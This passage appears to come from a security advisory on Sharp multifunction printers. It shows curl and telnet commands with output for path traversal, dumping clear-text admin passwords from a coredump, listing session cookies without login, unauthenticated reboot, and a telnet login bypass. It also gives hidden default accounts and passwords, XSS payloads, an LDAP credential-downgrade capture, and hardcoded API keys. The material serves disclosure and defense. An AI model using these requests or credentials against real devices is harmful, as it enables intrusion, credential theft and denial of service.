<pre><code>kali% var=`perl -e "print 'A'x639"`; curl -v -b "MFPSESSIONID=${var}EDCB" http://10.0.0.1/system.html
*   Trying 10.0.0.1:80...
* Connected to 10.0.0.1 (10.0.0.1) port 80 (#0)
&gt; GET /system.html HTTP/1.1
&gt; Host: 10.0.0.1
&gt; User-Agent: curl/7.88.1
&gt; Accept: */*
&gt; Cookie
&gt;
</code></pre>
<p><a id="pre-auth-lfi-pwn-02"></a></p>
<h3>Local File Inclusion of the coredump file</h3>
<p>We download the coredump file using the Local File Inclusion:</p>
<pre><code>kali% curl -i -s -k -X $'GET' \
    -H $'Host: 10.0.0.1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    $'http://10.0.0.1/installed_emanual_down.html?path=/manual/../../../mnt/log/core-main.log.gz.001' &gt; core-main.log.gz.001
kali% ls -la
total 16920
drwx------ 2 user user     4096 May 15 10:13 .
drwx------ 6 user user     4096 May 15 10:13 ..
-rw------- 1 user user 17316455 May 15 10:13 core-main.log.gz.001
kali% head -n 9 core-main.log.gz.001
HTTP/1.1 200 OK
Server: Rapid Logic/1.1
MIME-version: 1.0
Date: Thu Jan  1 00:02:12 1970 GMT
Content-Type: application/octet-stream; name=core-main.log.gz.001
Content-disposition: attachment; filename=core-main.log.gz.001
Content-Length: 17316180
Connection: close
</code></pre>
<p>We remove the first 9 lines from the core file (corresponding to HTTP headers) to generate a valid gzip file:</p>
<pre><code>kali% vi core-main.log.gz.001
kali% file core-main.log.gz.001
core-main.log.gz.001: gzip compressed data, last modified: Mon May 15 14:09:45 2023, from Unix, original size modulo 2^32 176379936 gzip compressed data, reserved method, ASCII, has CRC, has comment, encrypted, from FAT filesystem (MS-DOS, OS/2, NT), original size modulo 2^32 176379936
kali%
</code></pre>
<p><a id="pre-auth-lfi-pwn-03"></a></p>
<h3>Retrieve of credentials using the coredump files</h3>
<p>The core file contains the password (<code>PASS-PIERRE</code>) of the admin user even when the admin user has not been logged-in to the printer since the printer booted:</p>
<p>All the passwords can be found inside the core file, located near the <code>admin</code> string:</p>
<pre><code>kali% zcat core-main.log.gz.001 | strings | less
/mnt/std01/ACCBURS/
/mnt/std04/ACC/BROWSER/BROWSER_NONUSR  
/mnt/std01/ACC/AccBackUp/BROWSER_NONUSR
/mnt/std01/ACC/AccUserInfo      
/mnt/std04/ACC
/mnt/std01/ACC/AccUserInfo2     
/mnt/std04/ACC/BROWSER
/mnt/std01/ACC/AccGrpPrmtInfo   
/mnt/std01/ACCBURS 
/mnt/std01/ACC/AccFlashUserCounter
/mnt/std01/ACC/AccFlashBackUp   
/mnt/std01/ACC/AccTotalPix      
/mnt/std01/ACC/AccBackUp/JobInfo
Other User  
Other
Vender
Vender
Administrator 
admin
PASS-PIERRE &lt;--------------------- clear-text password for admin
Service
service
service
User
users
users
Vender2
Vender2
FSS User
servicefss
servicefss
System Operator
sysadmin
sysadmin
Device Account
deviceaccount
deviceaccount
/mnt/std01/ACC/AccGrpHomeInfo
/mnt/std01/ACC/AccBackUp
/mnt/std01/ACC
/mnt/std01/ACC/AccUserPixel
/mnt/std01/ACC/BROWSER
/mnt/std01/ACC/AccGrpCstmInfo
</code></pre>
<p><a id="pre-auth-lfi-pwn-04"></a></p>
<h3>Retrieve of credentials using configuration files</h3>
<p>The configuration files containing the credentials can be found in the /mnt/std04/DBMS/uaccnt.</p>
<p>When a password is updated, the files present in <code>/mnt/std04/DBMS/uaccnt/*</code> will be updated. It is possible to retrieve some credentials from these files:</p>
<pre><code>sh-4.3# pwd 
/mnt/std04/DBMS/uaccnt
sh-4.3# hexdump -C 9.01
00000000  ff ff ff bf ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
00000010  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
[...]
00005010  61 64 6d 69 6e 02 00 00  00 00 d0 00 00 64 65 76  |admin........dev|
00005020  69 63 65 61 63 63 6f 75  6e 74 09 00 00 00 00 50  |iceaccount.....P|
00005030  00 00 4f 74 68 65 72 01  00 00 00 00 70 00 00 73  |..Other.....p..s|
00005040  65 72 76 69 63 65 04 00  00 00 07 30 00 00 66 73  |ervice.....0..fs|
00005050  73 07 00 00 00 01 70 00  00 79 73 61 64 6d 69 6e  |s.....p..ysadmin|
00005060  08 00 00 00 00 50 00 00  75 73 65 72 73 05 00 00  |.....P..users...|
00005070  00 00 60 00 00 56 65 6e  64 65 72 03 00 00 00 06  |..`..Vender.....|
00005080  10 00 00 32 06 00 00 00  00 00 00 00 00 00 00 00  |...2............|
00005090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
[...]
sh-4.3#
</code></pre>
<p>An attacker can download these files and analyze them to retrieve the passwords.</p>
<p><a id="pre-auth-cookies"></a></p>
<h2>Details - Backdoor webpage - Listing of session cookies without authentication</h2>
<p>It was observed that Sharp printers are vulnerable to a listing of session cookies without authentication. Any attacker can list valid cookies by visiting a backdoor webpage and use them to authenticate to the printers.</p>
<p>It is possible to list the <code>MFPSESSIONID</code> session cookies by visiting the <code>/sessionlist.html</code> webpage without authentication:</p>
<p><img alt="" src="images/2024-sharp-listing-cookies.png" /></p>
<p><a href="images/2024-sharp-listing-cookies-full.png">Click here for full image</a></p>
<p>It is also possible to use curl from another machine:</p>
<pre><code>kali% curl -kv http://10.0.0.1/sessionlist.html
[...]
        &lt;h2&gt;Session list&lt;/h2&gt;
    &lt;table  class="matrix"&gt;
        &lt;tr&gt;
                &lt;th&gt;No.&lt;/th&gt;
                &lt;th&gt;User&lt;/th&gt;
                &lt;th&gt;From&lt;/th&gt;
                &lt;th&gt;Last login&lt;/th&gt;
                &lt;th&gt;Last access&lt;/th&gt;
                &lt;th&gt;Language ID&lt;/th&gt;
                &lt;th&gt;Cookie&lt;/th&gt;
        &lt;/tr&gt;
                &lt;tr&gt;
                        &lt;td&gt;0000&lt;/td&gt;
                        &lt;td&gt;Administrator&lt;/td&gt;
                        &lt;td&gt;10.0.0.10&lt;/td&gt;
                        &lt;td&gt;2023/05/16(Tue) 13:35:38&lt;/td&gt;
                        &lt;td&gt;2023/05/16(Tue) 13:35:38&lt;/clearTOStd&gt;
                        &lt;td&gt;02&lt;/td&gt;
                        &lt;td&gt;MFPSESSIONID=0200736B459709ABA789505BF27D765756D39B82B7ADE25E302820230516133538428B5C9D&lt;/td&gt;
                &lt;/tr&gt;
        &lt;/table&gt;
[...]
</code></pre>
<p>An attacker can retrieve valid session cookies and compromise the printer.</p>
<p>Note that a victim user must have been logged inside the printer prior to this attack in order to retrieve the corresponding session cookies.</p>
<p><a id="pre-auth-conf-webpages"></a></p>
<h2>Details - Configuration webpages reachable without authentication</h2>
<p>It was observed that some authenticated webpages are reachable without authentication on Sharp printers. Any attacker can modify parameters on these webpages without authentication.</p>
<p>A list of webpages supposed to require authentication but reachable without authentication is listed below:</p>
<ul>
<li>/address_smime_install.html</li>
<li>/send_fax_fcode_entry.html</li>
<li>/send_fax_fcode_entry_relay.html</li>
<li>/send_fax_fcode.html</li>
<li>/send_inbound_address_entry.html</li>
<li>/send_inbound_entry.html</li>
<li>/send_inbound.html</li>
<li>/send_receive_fw.html</li>
<li>/printer_ps.html</li>
</ul>
<p>For example, <code>/printer_ps.html</code>:</p>
<p><img alt="" src="images/2024-sharp-printer_ps.png" /></p>
<p><a href="images/2024-sharp-printer_ps-full.png">Click here for full image</a></p>
<p>An attacker can modify parameters of the printers without authentication.</p>
<p>The vendor confirmed this is the attended behavior.</p>
<p><a id="pre-auth-dos"></a></p>
<h2>Details - Reboot without authentication - Remote DoS</h2>
<p>It was observed that a specific webpage is reachable without authentication on Sharp printers. Any attacker can use this webpage to reboot the printer.</p>
<p>It is possible to reboot the printer by visiting the /sys_trayentryreboot.html without authentication.</p>
<p>When confirming the <code>Reboot Now</code> action, the printer will reboot:</p>
<p><img alt="" src="images/2024-sharp-unauth-reboot.png" /></p>
<p><a href="images/2024-sharp-unauth-reboot-full.png">Click here for full image</a></p>
<p>The printer will then reboot and will be unreachable for some minutes:</p>
<pre><code>PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.
^C
--- 10.0.0.1 ping statistics ---
5 packets transmitted, 0 received, 100% packet loss, time 4083ms
</code></pre>
<p>An attacker can DoS the printer by rebooting it indefinitely.</p>
<p><a id="backdoor-service"></a></p>
<h2>Details - Backdoor access - Service</h2>
<p>Sharp printers are configured with default credentials. Some accounts are hidden and can be abused by attackers to compromise the printers.</p>
<p>When analyzing the configuration of the printers, it appears there are several accounts visible on the web interface:</p>
<ul>
<li><code>Administrator</code> (uid 3)</li>
<li><code>System Administrator</code> (uid 8, as <code>System Operator</code>)</li>
<li><code>User</code> (uid 5)</li>
<li><code>Device Account</code> (uid 9)</li>
<li><code>Other User</code> (uid 1)</li>
</ul>
<p>After doing reverse engineering, the default passwords have been obtained:</p>
<ul>
<li>System Administrator: sysadmin</li>
<li>User: users</li>
<li>Device Account: deviceaccount</li>
<li>Other User: Other</li>
</ul>
<p>The Service account (corresponding to uid 4) does not appear on the user list, is not documented and allows an attacker to change the configuration of the printers and update the firmware image. The password for Service is <code>service</code>.</p>
<p>Several webpages can be found corresponding to this service user:</p>
<ul>
<li>/devicecloning_pp.html</li>
<li>/devicecloning.html</li>
<li>/service_ura_status_page.html</li>
<li>/service_testpage_ok.html</li>
<li>/service_testpage.html</li>
<li>/service_syslog_view.html</li>
<li>/service_syslog_settings_storage.html</li>
<li>/service_syslog_settings_server.html</li>
<li>/service_syslog_setting.html</li>
<li>/service_syslog_select.html</li>
<li>/service_syslog_save.html</li>
<li>/service_syslog_download.html</li>
<li>/service_softsw.html</li>
<li>/service_reboot.html</li>
<li>/serfildata_savepc.html</li>
<li>/service_account.html</li>
<li>/service_admin.html</li>
<li>/service_device_cloning.html</li>
<li>/service_filingdata.html</li>
<li>/service_testpage.html</li>
<li>/service_firm.html</li>
<li>/service_testpage.html</li>
<li>/service_font_down.html</li>
<li>/service_joblog.html</li>
<li>/service_joblog_list.html</li>
<li>/service_joblog_download.html</li>
<li>/service_joblog_select.html</li>
<li>/service_joblog_list_download.html</li>
<li>/service_machineid.html</li>
<li>/service_password.html</li>
<li>/sys_paperproperty.html</li>
<li>/sys_paperproperty_entry.html</li>
</ul>
<p>Listing of users:</p>
<p><img alt="" src="images/2024-sharp-admin-users.png" /></p>
<p><a href="images/2024-sharp-admin-users-full.png">Click here for full image</a></p>
<p>The service account can be discovered by visiting the webpage http://[ip]/account_user_entry.html?userid=-4 but the information cannot be edited:</p>
<p><img alt="" src="images/2024-sharp-user-service.png" /></p>
<p><a href="images/2024-sharp-user-service-full.png">Click here for full image</a></p>
<p>The <code>service</code> account can be used to change the configuration of the printer. The default webpage is http://[ip]/service_testpage.html and provides access to a lot of hidden functionalities:</p>
<ul>
<li>Device Cloning</li>
<li>Update of the firmware image to insert a malicious firmware image</li>
<li>Export settings</li>
<li>Configuration of the log server (disabling the logs, erasing the logs, ...)</li>
</ul>
<p>Device cloning:</p>
<p><img alt="" src="images/2024-sharp-service-clone.png" /></p>
<p><a href="images/2024-sharp-service-clone-full.png">Click here for full image</a></p>
<p>Update of the firmware:</p>
<p><img alt="" src="images/2024-sharp-service-update-fw.png" /></p>
<p><a href="images/2024-sharp-service-update-fw-full.png">Click here for full image</a></p>
<p>An attacker can use this additional backdoor account to compromise the printers.</p>
<p><a id="backdoor-fss-user"></a></p>
<h2>Details - Backdoor access - FSS User</h2>
<p>Sharp printers are configured with default credentials. Some accounts are hidden and can be abused by attackers to compromise the printers.</p>
<p>When analyzing the configuration of the printers, it appears there are several accounts visible on the web interface:</p>
<ul>
<li><code>Administrator</code> (uid 3)</li>
<li><code>System Administrator</code> (uid 8, as <code>System Operator</code>)</li>
<li><code>User</code> (uid 5)</li>
<li><code>Device Account</code> (uid 9)</li>
<li><code>Other User</code> (uid 1)</li>
</ul>
<p>After doing reverse engineering, the default passwords have been obtained:</p>
<ul>
<li>System Administrator: sysadmin</li>
<li>User: users</li>
<li>Device Account: deviceaccount</li>
<li>Other User: Other</li>
</ul>
<p>The FSS User account (corresponding to uid 7) does not appear on the user list, is not documented and allows an attacker to change the configuration of the printers and update the firmware image.</p>
<p>The password for FSS User is <code>servicefss</code>.</p>
<p>The FSS User has also admin privileges.</p>
<p>Several webpages can be found corresponding to this service user:</p>
<ul>
<li>/fss_default.html</li>
<li>/fss.html</li>
<li>/fss_password.html</li>
<li>/fss_account.html</li>
<li>/fss_backup_export.html</li>
<li>/fss_backup.html</li>
<li>/fss_backup_reboot.html</li>
</ul>
<p>The service account can be discovered by visiting the webpage http://[ip]/account_user_entry.html?userid=-7 but the information cannot be edited:</p>
<p><img alt="" src="images/2024-sharp-user-fssuser.png" /></p>
<p><a href="images/2024-sharp-user-fssuser-full.png">Click here for full image</a></p>
<p>The FSS User account can be used to change the configuration of the printer. The default webpage is http://[ip]/fss.html and provides access to hidden functionalities related to the support and a blind SSRF vulnerability:</p>
<p><img alt="" src="images/2024-sharp-fss.png" /></p>
<p><a href="images/2024-sharp-fss-full.png">Click here for full image</a></p>
<p>Reboot of the printer:</p>
<p><img alt="" src="images/2024-sharp-fss-reboot.png" /></p>
<p><a href="images/2024-sharp-fss-reboot-full.png">Click here for full image</a></p>
<p>An attacker can use this additional backdoor account to compromise the printers.</p>
<p><a id="insecure-default-credentials"></a></p>
<h2>Details - Insecure default credentials</h2>
<p>Sharp printers are configured with default and insecure credentials.</p>
<p>When doing reverse engineering against the <code>main</code> binary located inside the Sharp firmware image, we can extract the list of passwords for:</p>
<ul>
<li><code>Administrator</code> / <code>admin</code></li>
<li><code>Other User</code> / <code>Other</code></li>
<li><code>Device Account</code> / <code>deviceaccount</code></li>
<li><code>FSS User</code> / <code>servicefss</code></li>
<li><code>Service</code> / <code>service</code></li>
<li><code>User</code> / <code>users</code></li>
<li><code>System Operator</code> / <code>sysadmin</code></li>
</ul>
<p>Listing of username when analyzing main:</p>
<p><img alt="" src="images/2024-sharp-main-users-list.png" /></p>
<p>The listing of users can be retrieved from the web interface, using the admin user:</p>
<ul>
<li><code>Other User</code> - http://[ip]/account_user_entry.html?userid=-1</li>
<li><code>Vender</code> - http://[ip]/account_user_entry.html?userid=-2</li>
<li><code>Administrator</code> - http://[ip]/account_user_entry.html?userid=-3</li>
<li><code>Service</code> - http://[ip]/account_user_entry.html?userid=-4</li>
<li><code>User</code> - http://[ip]/account_user_entry.html?userid=-5</li>
<li><code>Vender2</code> - http://[ip]/account_user_entry.html?userid=-6</li>
<li><code>FSS User</code> - http://[ip]/account_user_entry.html?userid=-7, with admin privileges</li>
<li><code>System Operator</code> - http://[ip]/account_user_entry.html?userid=-8</li>
<li><code>Device Account</code> - http://[ip]/account_user_entry.html?userid=-9, with admin privileges</li>
</ul>
<p>An attacker can use these default accounts to compromise the printers.</p>
<p>The vendor confirmed this is the attended behavior.</p>
<p><a id="read-admin-access-telnet"></a></p>
<h2>Details - read admin access on telnet</h2>
<p>It is possible to bypass the authentication of the telnet server of any Sharp Printer (running any firmware version) by specifying an invalid user.</p>
<p>This authentication bypass provides an attacker with a full READ admin access to the printer.</p>
<p>Without the corresponding password of the admin user, the access will be denied:</p>
<pre><code>kali% telnet 10.0.0.1
Trying 10.0.0.1...
Connected to 10.0.0.1.
Escape character is '^]'.
SHARP MX-M365N Ver 01.06.00.0h.19 TELNET server.
Copyright(C) 2005-     SHARP CORPORATION
Copyright(C) 2005-     silex technology, Inc.
login: admin
'admin' user needs password to login.
password:
Login incorrect.
Connection closed by foreign host.
kali%
</code></pre>
<p>It is possible to send an invalid username (e.g. <code>adminAAAAAAAAAAAAAAAA[...]</code>) to bypass the authentication and get READ access with admin privileges:</p>
<pre><code>kali% telnet 10.0.0.1
Trying 10.0.0.1...
Connected to 10.0.0.1.
Escape character is '^]'.
SHARP MX-M365N Ver 01.06.00.0h.19 TELNET server.
Copyright(C) 2005-     SHARP CORPORATION
Copyright(C) 2005-     silex technology, Inc.
login: adminAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
User 'adminAAA' logged in.

 No.  Item                                Value            (level.1)
----------------------------------------------------------------------
  1 : Configure General
  2 : Configure TCP/IP
  3 : Configure NetWare
  4 : Configure AppleTalk
  5 : Configure NetBIOS
  6 : Configure AP I/F
  7 : Configure Gateway
 97 : Display Status
 98 : Reset Settings to Defaults
 99 : Exit
Please select(1 - 99)? 1

 No.  Item                                Value            (level.2)
----------------------------------------------------------------------
  1 : Print status page after bootup    : NO
  2 : SSL Mode                          : ALL
  3 : Rendezvous Enable                 : ENABLE
  4 : Rendezvous Name                   : "MX-M365N"
  5 : SMBC Enable                       : ENABLE
  6 : 802.1X auth
  7 : Frame Size                        : 1514
  8 : SMB Authentication Flags          : 15
 99 : Back to prior menu
Please select(1 - 99)? 99

 No.  Item                                Value            (level.1)
----------------------------------------------------------------------
  1 : Configure General
  2 : Configure TCP/IP
  3 : Configure NetWare
  4 : Configure AppleTalk
  5 : Configure NetBIOS
  6 : Configure AP I/F
  7 : Configure Gateway
 97 : Display Status
 98 : Reset Settings to Defaults
 99 : Exit

Please select(1 - 99)?
</code></pre>
<p><a id="xss-login"></a></p>
<h2>Details - XSS on the /login.html page</h2>
<p>There are 2 reflected XSS vulnerabilities located in the <code>/login.html</code> webpage.</p>
<p>HTTP request sent to <code>/login.html</code>, with the query string containing the payload <code>&lt;XSS&gt;";alert('XSS');"</code>:</p>
<p>The first XSS appears on the response on line 32:</p>
<p><img alt="" src="images/2024-sharp-xss-login-01.png" /></p>
<p>The second XSS appears on the response on line 183:</p>
<p><img alt="" src="images/2024-sharp-xss-login-02.png" /></p>
<p><a id="xss-all-pages"></a></p>
<h2>Details - XSS on all other HTML pages</h2>
<p>There are 3 reflected XSS vulnerabilities located in all the html webpages.</p>
<p>An attacker can send a HTTP request to any HTML webpage with the query string containing <code>";alert(1);&lt;XSS&gt;</code> to trigger:</p>
<ul>
<li>2 JavaScript-based XSS</li>
<li>1 HTML based XSS</li>
</ul>
<p>The HTTP request is sent to <code>/main.html</code>, with the query string containing the payload <code>";alert(1);&lt;XSS&gt;</code>:</p>
<p>The first XSS appears on the response on line 32:</p>
<p><img alt="" src="images/2024-sharp-xss-all-01.png" /></p>
<p>The second XSS appears on the response on line 87:</p>
<p><img alt="" src="images/2024-sharp-xss-all-02.png" /></p>
<p>The third XSS appears on the response on line 221:</p>
<p><img alt="" src="images/2024-sharp-xss-all-03.png" /></p>
<p>From the tests, all the HTML webpages are vulnerable to these 3 XSS.</p>
<p><a id="ldap-credentials-exfiltration"></a></p>
<h2>Details - Exfiltration of LDAP credentials by downgrading the security</h2>
<p>Sharp printers can be configured with a connection to a LDAP server, with credentials.</p>
<p>While the LDAP password is not shown on the web interface, an attacker with the admin password can retrieve the password by downgrading the authentication type to <code>SIMPLE</code>, which will enable clear-text communication to a malicious server.</p>
<p>With the <code>Connect Test</code>, an attacker can downgrade the security of the authentication to <code>SIMPLE</code> and retrieve the password in clear-text by specifying a malicious OpenLDAP server:</p>
<p>LDAP Configuration - http://10.0.0.1/nw_ldap_entry.html?ldapid=0:</p>
<p><img alt="" src="images/2024-sharp-ldap.png" /></p>
<p><a href="images/2024-sharp-ldap-full.png">Click here for full image</a></p>
<p>With a malicious OpenLDAP server receiving the connection, the password will be displayed in the logs:</p>
<pre><code>kali# /usr/sbin/slapd -d 10 -f /etc/ldap/slapd.conf  -h "ldap:/// ldaps:///"
6458d55e.3103c227 0x7fe72981e200 @(#) $OpenLDAP: slapd 2.5.13+dfsg-5 (Feb  8 2023 01:56:12) $
        Debian OpenLDAP Maintainers &lt;pkg-openldap-devel@lists.alioth.debian.org&gt;
6458d55e.319e91af 0x7fe72981e200 slapd starting
6458d55e.31a5bad7 0x7fe727bff6c0 daemon: added 4r listener=(nil)
6458d55e.31a6707c 0x7fe727bff6c0 daemon: added 7r listener=0x5586390ead60
6458d55e.31a6b53d 0x7fe727bff6c0 daemon: added 8r listener=0x5586390eae30
6458d55e.31a6f00d 0x7fe727bff6c0 daemon: added 9r listener=0x5586390ea740
6458d55e.31a7661d 0x7fe727bff6c0 daemon: added 10r listener=0x5586390ea810
6458d55e.31a94b33 0x7fe727bff6c0 daemon: epoll: listen=7 active_threads=0 tvp=zero
6458d55e.31a96f6a 0x7fe727bff6c0 daemon: epoll: listen=8 active_threads=0 tvp=zero
6458d55e.31a97916 0x7fe727bff6c0 daemon: epoll: listen=9 active_threads=0 tvp=zero
6458d55e.31a981b7 0x7fe727bff6c0 daemon: epoll: listen=10 active_threads=0 tvp=zero
6458d55e.31a9933f 0x7fe727bff6c0 daemon: activity on 1 descriptor
6458d55e.31a99baf 0x7fe727bff6c0 daemon: activity on:6458d55e.31a9a375 0x7fe727bff6c0 
6458d55e.31a9b6dc 0x7fe727bff6c0 daemon: epoll: listen=7 active_threads=0 tvp=zero
6458d55e.31a9d392 0x7fe727bff6c0 daemon: epoll: listen=8 active_threads=0 tvp=zero
6458d55e.31a9dc6e 0x7fe727bff6c0 daemon: epoll: listen=9 active_threads=0 tvp=zero
6458d55e.31a9f2b6 0x7fe727bff6c0 daemon: epoll: listen=10 active_threads=0 tvp=zero
6458d562.355e84dc 0x7fe727bff6c0 daemon: activity on 1 descriptor
6458d562.355f3b42 0x7fe727bff6c0 daemon: activity on:6458d562.355f593f 0x7fe727bff6c0 
6458d562.355fde77 0x7fe727bff6c0 daemon: epoll: listen=7 busy
6458d562.355ffeb9 0x7fe727bff6c0 daemon: epoll: listen=8 active_threads=0 tvp=zero
6458d562.35601b67 0x7fe727bff6c0 daemon: epoll: listen=9 active_threads=0 tvp=zero
6458d562.3560372e 0x7fe727bff6c0 daemon: epoll: listen=10 active_threads=0 tvp=zero
6458d562.35638596 0x7fe7273fe6c0 daemon: accept() = 14
6458d562.35646744 0x7fe7273fe6c0 daemon: listen=7, new connection on 14
6458d562.3564fc1e 0x7fe727bff6c0 daemon: activity on 1 descriptor
6458d562.35656f57 0x7fe727bff6c0 daemon: activity on:6458d562.35658b4c 0x7fe727bff6c0 
6458d562.3565d7f5 0x7fe727bff6c0 daemon: epoll: listen=7 active_threads=0 tvp=zero
6458d562.3565fb50 0x7fe727bff6c0 daemon: epoll: listen=8 active_threads=0 tvp=zero
6458d562.356615c1 0x7fe727bff6c0 daemon: epoll: listen=9 active_threads=0 tvp=zero
6458d562.35662d31 0x7fe727bff6c0 daemon: epoll: listen=10 active_threads=0 tvp=zero
6458d562.35691b42 0x7fe7273fe6c0 daemon: added 14r (active) listener=(nil)
6458d562.356a5b81 0x7fe727bff6c0 daemon: activity on 2 descriptors
6458d562.356b0c68 0x7fe727bff6c0 daemon: activity on:6458d562.356b54fa 0x7fe727bff6c0  14r6458d562.356b948e 0x7fe727bff6c0 
6458d562.356bfc9e 0x7fe727bff6c0 daemon: read active on 14
6458d562.356ce70e 0x7fe727bff6c0 daemon: epoll: listen=7 active_threads=0 tvp=zero
6458d562.356d5571 0x7fe727bff6c0 daemon: epoll: listen=8 active_threads=0 tvp=zero
6458d562.356db465 0x7fe727bff6c0 daemon: epoll: listen=9 active_threads=0 tvp=zero
6458d562.356e155f 0x7fe727bff6c0 daemon: epoll: listen=10 active_threads=0 tvp=zero
6458d562.356f5783 0x7fe7273fe6c0 ldap_read: want=8, got=8
6458d562.356f9399 0x7fe7273fe6c0   0000:  30 31 02 01 01 01 01 01                            01......          
6458d562.356fd33a 0x7fe7273fe6c0 ldap_read: want=43, got=43
6458d562.3570169a 0x7fe7273fe6c0   0000:  01 03 04 15 6c 64 61 70  2d 63 72 65 64 73 35 40   ....ldap-creds5@
6458d562.357033a1 0x7fe7273fe6c0   0010:  64 6f 6d 61 69 6e 2e 6c  61 2e 2e 50 41 53 53 57   domain.la..PASSW
6458d562.35704d44 0x7fe7273fe6c0   0020:  4f 52 44 2d 49 4e 2d 43  4c 45 41 52               ORD-IN-CLEAR
6458d562.357231ef 0x7fe7273fe6c0 ldap_read: want=8 error=Resource temporarily unavailable
</code></pre>
<p>It is also possible to use wireshark to display the password.</p>
<p><a id="hardcoded-google-api-keys"></a></p>
<h2>Details - Hardcoded Google API Keys</h2>
<p>The printers contain private API Keys in the <code>main</code> program.</p>
<p>It is possible to retrieve specific googlecontent.com domain names in the main program:</p>
<p><img alt="" src="images/2024-sharp-ida-main-strings-googleusercontent.png" /></p>
<p>Reverse Engineering of the <code>sub_2146D54()</code> function defined in the main program will reveal some hardcoded keys:</p>
<p><img alt="" src="images/2024-sharp-ida-main-sub_2146D54-google-passwords-01.png" /></p>
<p><img alt="" src="images/2024-sharp-ida-main-sub_2146D54-google-passwords-02.png" /></p>
<p>The domains listed in the binary are:</p>
<ul>
<li>265490466885-m5cjvglv9q8aak493cgepe7juvafgh8c.apps.googleusercontent.com</li>
<li>347970444986-0pij6u2tfhb240edjmls3h1u8qm2v2b3.apps.googleusercontent.com</li>
<li>410988772526-6ujegl6jvquh9kstiegva8fk5j2ogag9.apps.googleusercontent.com</li>
<li>292646726735-033ggn9hmlrs8bntrj0fbstob9m8qt26.apps.googleusercontent.com </li>
</ul>
<p>These domains do not appear to be used anymore and are free for any user. An attacker can use them to receive traffic from the printers.</p>
<p><a id="hardcoded-aws-api-keys"></a></p>
<h2>Details - Hardcoded Amazon API Keys</h2>
<p>The printers contain private API Keys in the <code>main</code> program.</p>
<p>It is possible to retrieve a specific amazonaws.com address in the <code>main</code> program:</p>
<ul>
<li>https://7db3z5d116.execute-api.ap-northeast-1.amazonaws.com/prod/MFPDataAlalytics       </li>
</ul>
<p>When Cross-referencing this address, it appears that some private API keys are hardcoded in the program, as shown below:</p>
<ul>
<li>Postman private key: <code>44688039-5104-39be-f974-c1f5ef621a5f</code></li>
<li>API-KEY: <code>PBYXSIK6av8fBt8Qe1EQUaF9ZaKvTDutaXS9YwWA</code></li>
</ul>
<p>Reverse Engineering of the sub_20D542C function defined in the <code>main</code> program:</p>
<p><img alt="" src="images/2024-sharp-ida-main-sub_20D542C-aws-01.png" /></p>
<p><img alt="" src="images/2024-sharp-ida-main-sub_20D542C-aws-02.png" /></p>
<p>We can see that curl is invoked with the <code>-k</code> option (aka <code>--insecure</code>) so any invalid SSL certificate will be accepted:</p>
<p>The pseudo-code of <code>sub_20D542C()</code> is:</p>
<pre><code>int __fastcall sub_20D542C(const char *a1, const char *a2)
{
...
        if ( sub_6A0DA0(606420, 0) )
        {
          sub_6A174C((char *)&amp;loc_940DC + 2, v4, 255);
          sub_6A174C((char *)&amp;loc_940DC + 3, v6, 80);
          sub_6A174C(606432, v7, 80);
          if ( !*v6 )
            j_strncpy_0(v6, "user", 0x50u);
          v11 = sub_6A107C(&amp;loc_940E8, 3080);
          j_snprintf(
            v9,
            0x800u,
            "/usr/bin/curl -k -o %s -U %s:%s -x %s:%d -X POST -d @\"%s\" -H \"x-api-key: PBYXSIK6av8fBt8Qe1EQUaF9ZaKvTDut"
            "aXS9YwWA\" -H \"Cache-Control: no-cache\" -H \"Postman-Token: 44688039-5104-39be-f974-c1f5ef621a5f\" -L \"%s\"",
            a2, 
            v6,
            v7,
            v4,
            v11,
            a1,
            "https://7db3z5d116.execute-api.ap-northeast-1.amazonaws.com/prod/MFPDataAlalytics");
          sub_20D7E20(
            "[analy][curl] /usr/bin/curl -k -o %s -U %s:xxx -x %s:%d -X POST -d @\"%s\"  -H \"x-api-key: PBYXSIK6av8fBt8Q"
            "e1EQUaF9ZaKvTDutaXS9YwWA\" -H \"Cache-Control: no-cache\" -H \"Postman-Token: 44688039-5104-39be-f974-c1f5ef"
            "621a5f\" -L \"%s\"\n",
            a2,
            v6,
            v4,
            v11,
            a1,
            "https://7db3z5d116.execute-api.ap-northeast-1.amazonaws.com/prod/MFPDataAlalytics");
        }
        else
        {
          j_snprintf(
            v9,
            0x800u,
            "/usr/bin/curl -k -o %s -X POST -d @\"%s\" -H \"x-api-key: PBYXSIK6av8fBt8Qe1EQUaF9ZaKvTDutaXS9YwWA\" -H \"Ca"
            "che-Control: no-cache\" -H \"Postman-Token: 44688039-5104-39be-f974-c1f5ef621a5f\" -L \"%s\"",
            a2,
            a1,
            "https://7db3z5d116.execute-api.ap-northeast-1.amazonaws.com/prod/MFPDataAlalytics");
          sub_20D7E20(
            "[analy][curl] /usr/bin/curl -k -o %s -X POST -d @\"%s\" -H \"x-api-key: PBYXSIK6av8fBt8Qe1EQUaF9ZaKvTDutaXS9"
            "YwWA\" -H \"Cache-Control: no-cache\" -H \"Postman-Token: 44688039-5104-39be-f974-c1f5ef621a5f\" -L \"%s\"\n",
            a2,
            a1,
            "https://7db3z5d116.execute-api.ap-northeast-1.amazonaws.com/prod/MFPDataAlalytics");
        }
        v12 = j_mfp_system((int)v9);
</code></pre>
<p><a id="cve-2022-45796"></a></p>
<h2>Details - CVE-2022-45796 - RCE</h2>
<p>Since the PoC for <a href="https://jvn.jp/en/vu/JVNVU96195138/index.html">CVE-2022-45796</a> was not public, an authenticated admin user can go to http://ip/nw_interface.html and use the IPv6 IP field to exploit a command injection:</p>
